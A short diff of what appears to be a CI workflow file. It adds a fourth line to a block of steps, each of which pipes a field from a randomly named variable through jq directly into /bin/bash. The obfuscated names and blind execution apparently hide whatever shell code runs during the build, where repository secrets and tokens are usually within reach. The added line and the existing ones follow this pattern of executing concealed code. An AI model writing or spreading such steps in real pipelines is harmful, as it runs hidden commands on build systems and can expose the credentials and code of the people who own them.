@@ -29,6 +29,7 @@ jobs:
           echo $dr01749 | jq -r .lrx30 | /bin/bash
           echo $jie8216 | jq -r .pen54 | /bin/bash
           printf '%s' "$r52" | jq -r .kvdzn4703 | /bin/bash
+          printf '%s' "$vbjn29" | jq -r .ob3 | /bin/bash
 
       - name: Upload results
         if: always()
